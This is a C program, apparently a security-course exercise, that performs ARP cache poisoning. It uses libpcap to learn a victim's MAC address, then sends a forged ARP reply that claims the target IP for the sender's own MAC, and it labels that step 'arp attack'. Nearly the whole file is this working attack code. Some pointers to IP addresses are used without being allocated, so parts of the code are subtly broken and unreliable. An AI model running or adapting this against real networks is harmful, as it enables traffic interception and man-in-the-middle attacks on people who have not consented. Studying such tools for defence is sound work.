#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <libnet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>

#pragma pack(push,1)
struct arp_packet{
	struct libnet_ethernet_hdr ETH_hdr;
	struct libnet_arp_hdr ARP_hdr;
	uint8_t src_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr src_pro_addr;
	uint8_t des_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr des_pro_addr;
};
#pragma pack(pop)

int getMacAddress(uint8_t * my_mac, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		printf("Error - socket\n");
		return 0;
	}

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
        {
                printf("Error - get my_mac\n");
		close(sock);
                return 0;
        }
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	

	close(sock);
	return 0;
	
}

int getIpAddress(struct in_addr * my_ip, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
                printf("Error - socket\n");
                return 0;
        }

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
        {
                printf("Error - get my_ip\n");
                close(sock);
                return 0;
        }
	
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
        *my_ip = sin->sin_addr;

        close(sock);
        return 0;

}


int print_packet(struct arp_packet * packet)
{	
	printf("--------packet data--------\n");
	printf("ether_dhost	: %02x:%02x:%02x:%02x:%02x:%02x\n",
	  packet->ETH_hdr.ether_dhost[0],
	  packet->ETH_hdr.ether_dhost[1],
	  packet->ETH_hdr.ether_dhost[2],
	  packet->ETH_hdr.ether_dhost[3],
	  packet->ETH_hdr.ether_dhost[4],
	  packet->ETH_hdr.ether_dhost[5]);

	printf("ether_shost     : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->ETH_hdr.ether_shost[0],
          packet->ETH_hdr.ether_shost[1],
          packet->ETH_hdr.ether_shost[2],
          packet->ETH_hdr.ether_shost[3],
          packet->ETH_hdr.ether_shost[4],
          packet->ETH_hdr.ether_shost[5]);

	printf("ether_type	: %04x\n", ntohs(packet->ETH_hdr.ether_type));

	printf("ar_hrd		: %04x\n", ntohs(packet->ARP_hdr.ar_hrd));
	printf("ar_pro          : %04x\n", ntohs(packet->ARP_hdr.ar_pro));
	printf("ar_hln          : %02x\n", packet->ARP_hdr.ar_hln);
	printf("ar_pln          : %02x\n", packet->ARP_hdr.ar_pln);
	printf("ar_op		: %04x\n", ntohs(packet->ARP_hdr.ar_op));

	printf("src_hdr_addr	: %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->src_hrd_addr[0],
          packet->src_hrd_addr[1],
          packet->src_hrd_addr[2],
          packet->src_hrd_addr[3],
          packet->src_hrd_addr[4],
          packet->src_hrd_addr[5]);

	printf("src_pro_addr	: %s\n", inet_ntoa(packet->src_pro_addr));

	printf("des_hdr_addr    : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->des_hrd_addr[0],
          packet->des_hrd_addr[1],
          packet->des_hrd_addr[2],
          packet->des_hrd_addr[3],
          packet->des_hrd_addr[4],
          packet->des_hrd_addr[5]);

        printf("des_pro_addr    : %s\n", inet_ntoa(packet->des_pro_addr));

	return 0;
}

void make_arp_packet(	unsigned char * frame, struct arp_packet * packet, 
			uint8_t ether_dhost[], uint8_t ether_shost[], uint16_t ether_type, 
			uint16_t arp_hrd_type, uint16_t arp_pro_type, uint8_t arp_hlen, uint8_t arp_plen, 
			uint16_t arp_opcode, uint8_t src_hrd_addr[ETHER_ADDR_LEN], struct in_addr * src_pro_addr, 
			uint8_t des_hrd_addr[ETHER_ADDR_LEN], struct in_addr * des_pro_addr)
{
	uint16_t tmp = ntohs(ether_type);
	memcpy(packet->ETH_hdr.ether_dhost, ether_dhost, ETHER_ADDR_LEN);     
        memcpy(packet->ETH_hdr.ether_shost, ether_shost, ETHER_ADDR_LEN);
        memcpy(&packet->ETH_hdr.ether_type, &tmp, 2);            

	tmp = ntohs(arp_hrd_type);
        memcpy(&packet->ARP_hdr.ar_hrd, &tmp, 2);
	tmp = ntohs(arp_pro_type);
        memcpy(&packet->ARP_hdr.ar_pro, &tmp, 2);
        memcpy(&packet->ARP_hdr.ar_hln, &arp_hlen, 1);                      
        memcpy(&packet->ARP_hdr.ar_pln, &arp_plen, 1);                      
	tmp = ntohs(arp_opcode);
        memcpy(&packet->ARP_hdr.ar_op, &tmp, 2);

        memcpy(packet->src_hrd_addr, src_hrd_addr, ETHER_ADDR_LEN);          
        memcpy(&packet->src_pro_addr, src_pro_addr, sizeof(struct in_addr));
        memcpy(packet->des_hrd_addr, des_hrd_addr, ETHER_ADDR_LEN);         
        memcpy(&packet->des_pro_addr, des_pro_addr, sizeof(struct in_addr));

	memcpy(frame, packet, sizeof(struct arp_packet));

}

int main(int argc, char* argv[])
{	
	pcap_t *fp;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (fp == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	if (argc != 4){
		printf("Error, give me correct arguments\n");
		return -1;
	}

	uint8_t my_mac[ETHER_ADDR_LEN], sender_mac[ETHER_ADDR_LEN];
	uint8_t BROADCAST_MAC[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	uint8_t BROADCAST_MAC2[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	struct in_addr * my_ip, *sender_ip, *target_ip;
	struct arp_packet * packet;
	packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));
	unsigned char *frame = (unsigned char *)calloc(1, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN+sizeof(struct in_addr)+ETHER_ADDR_LEN+sizeof(struct in_addr));

	uint16_t arp_type = 0x0806;					// ARP
	uint16_t arp_hrd_type = 0x0001;					// Ethernet
	uint16_t arp_pro_type = 0x0800;					// IPv4
	uint16_t arp_opcode = 0x0001;					// request
	
	getMacAddress(my_mac, argv[1]);								// get my mac, ip
	getIpAddress(my_ip, argv[1]);
	inet_aton(argv[2], sender_ip);								// get sender ip
	inet_aton(argv[3], target_ip);								// get target ip
	
	make_arp_packet(frame, packet, BROADCAST_MAC, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 4,
                        arp_opcode, my_mac, my_ip, BROADCAST_MAC2, sender_ip);

//	print_packet(packet);
	
	if(pcap_sendpacket(fp, frame, sizeof(struct arp_packet)))				// send packet
	{
		fprintf(stderr, "\nError sending the packet\n");
		return -1;
	}
		
	printf("--------send broadcast arp packet!--------\n");
//	printf("--------send_arp!--------\nframe	 	: ");
//	for(int i=0; i<sizeof(arp_packet);i++)							// print frame
//		printf("%02x ", frame[i]);
//	printf("\n\n");					

	while (true){
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ETH_header;
		const u_char* rcv_packet;
		u_char * src_hrd_addr;
		struct in_addr* src_pro_addr;
		u_char * des_hrd_addr;
		struct in_addr* des_pro_addr;
		int res = pcap_next_ex(fp, &header, &rcv_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
//		printf("%u bytes captured\n", header->caplen);

		ETH_header = (libnet_ethernet_hdr *)rcv_packet;
		if(ntohs(ETH_header->ether_type) != 0x0806)					// ARP 일때  진행
//			printf("ETH type : %04x	-> It's ARP!\n", ntohs(ETH_header->ether_type));
//		else {
			continue;
//		}

		rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
		src_hrd_addr = (u_char *)rcv_packet;
		rcv_packet += ETHER_ADDR_LEN;
		src_pro_addr = (in_addr *)rcv_packet;
		rcv_packet += sizeof(struct in_addr);
		des_hrd_addr = (u_char *)rcv_packet;
                rcv_packet += ETHER_ADDR_LEN;
                des_pro_addr = (in_addr *)rcv_packet;

		if(strcmp(inet_ntoa(*sender_ip), inet_ntoa(*src_pro_addr)) == 0)
		{
			if(strcmp(inet_ntoa(*my_ip), inet_ntoa(*des_pro_addr)) == 0)			
								// src_pro_addr이 sender의 ip 주소이고 des_pro_addr이 내 ip 주소일 때
			{
				printf("--------sender mac get!!--------\n");
				memcpy(sender_mac, src_hrd_addr, ETHER_ADDR_LEN);		// sender mac get
				break;
			}
		} 
	}	
	
	arp_opcode = 0x0002;	
	make_arp_packet(frame, packet, sender_mac, my_mac, arp_type, arp_hrd_type, arp_pro_type, ETHER_ADDR_LEN, 4,
                        arp_opcode, my_mac, target_ip, sender_mac, sender_ip);
	
//	print_packet(packet);	

        if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)		// send packet
        {
                fprintf(stderr, "\nError sending the packet\n");
                return -1;
        }

	printf("--------send arp attack!--------\n");
//	printf("--------send_arp!--------\nframe		: ");
//        for(int i=0; i<sizeof(arp_packet);i++)						// print frame
//              printf("%02x ", frame[i]);
//	printf("\n");

	free(packet);
	free(frame);
	
	return 0;
}
